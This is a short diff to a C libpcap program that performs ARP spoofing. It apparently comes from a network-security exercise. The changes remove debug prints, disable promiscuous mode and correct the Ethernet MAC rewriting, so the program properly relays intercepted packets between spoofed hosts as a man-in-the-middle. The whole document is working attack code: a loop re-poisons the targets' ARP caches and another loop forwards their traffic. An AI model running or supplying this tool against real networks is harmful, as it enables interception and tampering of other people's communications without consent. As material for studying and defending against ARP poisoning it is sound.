@@ -10,7 +10,6 @@ int slen;
 
 void preserve() {
 	while(1) {
-		printf("Hello!\n");
 		for (int i = 0 ; i < slen ; i++) {
 			sendARP(handle, spoofList + i, &attacker);
 		}
@@ -23,7 +22,7 @@ int main(int argc, char *argv[]) {
 	assert (!(argc & 1), "Argument missmatch : target IP should be exist");
 	
 	dev = argv[1];
-	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+	handle = pcap_open_live(dev, BUFSIZ, 0, 1000, errbuf);
 	assert(handle != NULL, "Cannot open interface");
 	
 	getMacAddr(&attacker, dev);
@@ -59,23 +58,23 @@ int main(int argc, char *argv[]) {
 	struct pcap_pkthdr *hdr;
 	while(1) {
 		if(!load(handle, &hdr, &pkt)) break;
-		printf("WOW!\n");
 		if (isARP(pkt)) {
 			for (int i = 0 ; i < slen ; i++) {
 				sendARP(handle, spoofList + i, &attacker);
 			}
 		} else {
+			if (memcmp((void *)(pkt + 0), attacker.MAC, 6)) continue;
 			struct spoofTarget *t = NULL;
 			for (int i = 0 ; i < slen ; i++) {
-				if (!memcmp(pkt, spoofList[i].sender.MAC, 6)) {
+				if (!memcmp((void *)(pkt + 6), spoofList[i].sender.MAC, 6)) {
 					t = spoofList + i;
 					break;
 				}
 			}
 
 			if (t == NULL) continue;
-			memcpy((void *)(pkt + 0), attacker.MAC, 6);
-			memcpy((void *)(pkt + 6), t->target.MAC, 6); 
+			memcpy((void *)(pkt + 6), attacker.MAC, 6);
+			memcpy((void *)(pkt + 0), t->target.MAC, 6); 
 			pcap_sendpacket(handle, pkt, hdr->len);
 		}
 	}
